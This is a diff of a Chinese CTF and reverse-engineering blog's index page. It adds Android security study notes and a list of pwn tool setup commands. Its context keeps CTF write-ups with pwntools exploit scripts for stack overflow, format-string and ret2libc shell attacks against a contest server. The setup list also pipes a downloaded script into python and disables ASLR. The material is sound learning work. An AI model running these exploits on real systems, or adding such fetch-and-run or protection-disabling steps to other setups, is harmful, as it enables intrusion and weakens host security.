@@ -192,7 +192,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn-二进制-CTF/">Pwn 二进制 CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Re/">Re</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-pwn/">ctf pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-ctf/">pwn ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows逆向/">windows逆向</a></li></ul>
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn-二进制-CTF/">Pwn 二进制 CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Re/">Re</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-pwn/">ctf pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-ctf/">pwn ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows逆向/">windows逆向</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安卓/">安卓</a></li></ul>
                     </div>
                 </section>
                 
@@ -268,6 +268,255 @@
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-pwn-1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/08/05/pwn-1/" class="article-date">
+      <time datetime="2018-08-05T01:02:22.000Z" itemprop="datePublished">2018-08-05</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/05/pwn-1/">pwn_1</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-安卓逆向-day1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/08/04/安卓逆向-day1/" class="article-date">
+      <time datetime="2018-08-04T01:11:29.000Z" itemprop="datePublished">2018-08-04</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/04/安卓逆向-day1/">安卓逆向_day1</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="安卓"><a href="#安卓" class="headerlink" title="安卓"></a>安卓</h1><h2 id="Android整体架构"><a href="#Android整体架构" class="headerlink" title="Android整体架构"></a>Android整体架构</h2><ul>
+<li>Android Runtime<ul>
+<li>提供了JAVA编程语言核心库的大多数功能</li>
+<li>应用程序都对应独立的虚拟机</li>
+</ul>
+</li>
+<li>硬件抽象层<ul>
+<li>把Android framework与Linux kernel隔开</li>
+<li>保护厂商利益<ul>
+<li>Linux kernel遵循GPL协议</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>驱动分为user space kernel space</li>
+<li>基于Linux的用户隔离<ul>
+<li>Linux：用户被分配自己的UID，程序可以指定UID运行</li>
+<li>Android：每个程序有自己的UID，UID用以区分应用程序</li>
+<li>应用有自己的数据存放目录</li>
+<li>存在共享UID的特殊情况</li>
+</ul>
+</li>
+</ul>
+<h2 id="Android安全模型"><a href="#Android安全模型" class="headerlink" title="Android安全模型"></a>Android安全模型</h2><ul>
+<li>应用权限<ul>
+<li>细粒度控制</li>
+<li>应用通过Manifests.xml申请权限</li>
+<li>权限检查可以由内核进行，也可以用Android系统执行</li>
+</ul>
+</li>
+<li>代码签名<ul>
+<li>apk必须有开发者签名</li>
+</ul>
+</li>
+<li>SELinux<ul>
+<li>Security Enhancements for Android</li>
+<li>强制访问控制(MAC)</li>
+<li>核心系统守护进程和用户应用隔离到不同的domain</li>
+</ul>
+</li>
+<li>系统更新<ul>
+<li>解锁、BootLoader、Recovery</li>
+<li>Recovery是一个小型的系统，可以访问所有的设备分区</li>
+<li>通常只允许签名验证通过的刷写</li>
+<li>解锁:允许替换Recovery和系统镜像<ul>
+<li>将会清除所有的用户数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="分析环境和常用工具"><a href="#分析环境和常用工具" class="headerlink" title="分析环境和常用工具"></a>分析环境和常用工具</h2><ul>
+<li>satoku<ul>
+<li>基于Linux的Android取证，逆向，开发的平台</li>
+<li>2014年9月停止更新了</li>
+</ul>
+</li>
+<li>Android studio<ul>
+<li>Android应用开发</li>
+<li>APK分析，性能分析</li>
+</ul>
+</li>
+<li>JEB<ul>
+<li>Android逆向工具</li>
+<li>支持无源码调试</li>
+<li>提供APM、Mips、Intel x86/64反编译支持</li>
+</ul>
+</li>
+<li>jdax<ul>
+<li>开源dex文件反编译工具</li>
+</ul>
+</li>
+<li>smali、baksmali、APKTool<ul>
+<li>反汇编常用工具</li>
+<li>dex文件和smali代码相互转换</li>
+<li>apk文件的解包和打包</li>
+</ul>
+</li>
+<li>IDA PRO<ul>
+<li>支持Dalvik指令集反汇编</li>
+<li>多用于动态调试的Native代码</li>
+</ul>
+</li>
+</ul>
+<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><ul>
+<li>JNI<ul>
+<li>Java与Native沟通的桥梁</li>
+<li>JNI的注册<ul>
+<li>静态注册（名字对应）—Demo</li>
+<li>动态注册（RegisterNativeMethods）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>JNI_OnLoad<ul>
+<li>在加载so文件时将被执行</li>
+</ul>
+</li>
+<li>Demo hiddendata</li>
+</ul>
+<h2 id="加壳技术"><a href="#加壳技术" class="headerlink" title="加壳技术"></a>加壳技术</h2><ul>
+<li>反编译代价低<ul>
+<li>利用动态代码加载技术</li>
+<li>隐藏原本的dex文件</li>
+</ul>
+</li>
+<li>动态加载过程隐蔽，复杂度高</li>
+<li>增加完整性检查，反调试措施</li>
+</ul>
+<h2 id="Android应用四大组件"><a href="#Android应用四大组件" class="headerlink" title="Android应用四大组件"></a>Android应用四大组件</h2><ul>
+<li>Activity<ul>
+<li>具有用户界面的单一屏幕</li>
+<li>UI相关</li>
+</ul>
+</li>
+<li>Service<ul>
+<li>后台运行的组件</li>
+</ul>
+</li>
+<li>Content Provider<ul>
+<li>共享应用数据</li>
+</ul>
+</li>
+<li>Broadcast Receiver<ul>
+<li>响应广播通知</li>
+</ul>
+</li>
+</ul>
+<h2 id="应用层安全"><a href="#应用层安全" class="headerlink" title="应用层安全"></a>应用层安全</h2><ul>
+<li>本质是权限控制<ul>
+<li><intent-filter></intent-filter></li>
+<li>Android:exported = “true”</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安卓/">安卓</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-Re-day2" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -552,6 +801,29 @@
 <h1 id="pwn2-函数跳转"><a href="#pwn2-函数跳转" class="headerlink" title="pwn2: 函数跳转"></a>pwn2: 函数跳转</h1><p>jctf{234dg5g5h5h5hy2h2h234rg34g34grg3}<br>溢出点经过测试为40<br><br>和第一题思路一样，但是覆盖的是获得shell的函数，通过这个函数我们使用cat flag获得flag<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"># p = process(&quot;./2&quot;)</span><br><span class="line">get_shell = 0x000000000040078F</span><br><span class="line">p = remote(&apos;218.2.197.241&apos;,&apos;58642&apos;)</span><br><span class="line">payload = &quot;a&quot;*40 + p64(get_shell)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;your name is:\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
 <h1 id="pwn3-格式化字符串"><a href="#pwn3-格式化字符串" class="headerlink" title="pwn3:格式化字符串"></a>pwn3:格式化字符串</h1><p>jctf{234dg5g5h5h5hy2h2h234rg34g34grg3}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">payload = &quot;\x30\xa0\x04\x08\x31\xa0\x04\x08\x32\xa0\x04\x08\x33\xa0\x04\x08%18x%12$n%17x%13$n%495x%14$n&quot;</span><br><span class="line"># p = process(&quot;./3&quot;)</span><br><span class="line">p = remote(&apos;218.2.197.241&apos;, &apos;36731&apos;)</span><br><span class="line">#context.clear(arch = &apos;i386&apos;)</span><br><span class="line">#payload = repr(fmtstr_payload(12, &#123;0x0804a030: 0x02223322&#125;, write_size=&apos;byte&apos;))</span><br><span class="line">print payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recvall()</span><br></pre></td></tr></table></figure></p>
 <p>#pwn4:内存泄漏的栈溢出<br>jctf{234dg5g5h5h5hy2h2h234rg34g34grg3}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">libc = ELF(&apos;libc-2.23.so&apos;)</span><br><span class="line">elf = ELF(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line"># p = process(&apos;./4&apos;)</span><br><span class="line">p = remote(&apos;218.2.197.241&apos;, &apos;29663&apos;)</span><br><span class="line">#p = remote(&apos;127.0.0.1&apos;, 10003)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[&apos;write&apos;]</span><br><span class="line">print &apos;plt_write= &apos; + hex(plt_write)</span><br><span class="line">got_write = elf.got[&apos;write&apos;]</span><br><span class="line">print &apos;got_write= &apos; + hex(got_write)</span><br><span class="line">vulfun_addr = 0x08048474</span><br><span class="line">print &apos;vulfun= &apos; + hex(vulfun_addr)</span><br><span class="line"></span><br><span class="line">payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(4))</span><br><span class="line">print &apos;write_addr=&apos; + hex(write_addr)</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])</span><br><span class="line">print &apos;system_addr= &apos; + hex(system_addr)</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))</span><br><span class="line">print &apos;binsh_addr= &apos; + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;a&apos;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h1 id="pwn工具"><a href="#pwn工具" class="headerlink" title="pwn工具"></a>pwn工具</h1><ul>
+<li>fish shell<ul>
+<li><a href="https://blog.csdn.net/oiken/article/details/71081959" target="_blank" rel="noopener">https://blog.csdn.net/oiken/article/details/71081959</a></li>
+</ul>
+</li>
+<li>peda<ul>
+<li><a href="http://blog.csdn.net/gatieme/article/details/63254211" target="_blank" rel="noopener">http://blog.csdn.net/gatieme/article/details/63254211</a></li>
+</ul>
+</li>
+<li>pwntools<ul>
+<li><a href="http://blog.csdn.net/gyhgx/article/details/53439417" target="_blank" rel="noopener">http://blog.csdn.net/gyhgx/article/details/53439417</a></li>
+</ul>
+</li>
+<li>关闭内存随机化<ul>
+<li>sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space</li>
+</ul>
+</li>
+<li>curl <a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a> | python</li>
+<li>sudo apt-get install libssl-dev</li>
+<li>wget <a href="https://raw.githubusercontent.com/giantbranch/pwn-env-init/master/pwn_init.sh" target="_blank" rel="noopener">https://raw.githubusercontent.com/giantbranch/pwn-env-init/master/pwn_init.sh</a></li>
+<li>chmod +x pwn_init.sh</li>
+<li>./pwn_init.sh</li>
+</ul>
 
       
     </div>
@@ -756,134 +1028,6 @@
       
         <p class="article-more-link">
           <a href="/2017/12/12/LIEF中文文档/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-DCTF线下赛pwn题攻防" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/12/09/DCTF线下赛pwn题攻防/" class="article-date">
-      <time datetime="2017-12-09T02:00:33.000Z" itemprop="datePublished">2017-12-09</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/12/09/DCTF线下赛pwn题攻防/">DCTF线下赛pwn题攻防</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>最近在整理线下赛用的工具，顺便看到了这道很有意思的题目。接下来我们就来调试一下这个巨坑的题目、<br></p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-pwn/">ctf pwn</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="/2017/12/09/DCTF线下赛pwn题攻防/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-windows逆向CreakMe系列入门：单步调试获取flag-1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/11/21/windows逆向CreakMe系列入门：单步调试获取flag-1/" class="article-date">
-      <time datetime="2017-11-21T07:36:24.000Z" itemprop="datePublished">2017-11-21</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/11/21/windows逆向CreakMe系列入门：单步调试获取flag-1/">windows逆向CreakMe系列入门：单步调试获取flag</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>CreakMe系列是逆向入门的一个很棒的系列。<br><br>今天我介绍一个很简单的CreakMe002。<br></p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows逆向/">windows逆向</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="/2017/11/21/windows逆向CreakMe系列入门：单步调试获取flag-1/#more">阅读全文 >></a>
         </p>
       
       <div class="clearfix"></div>
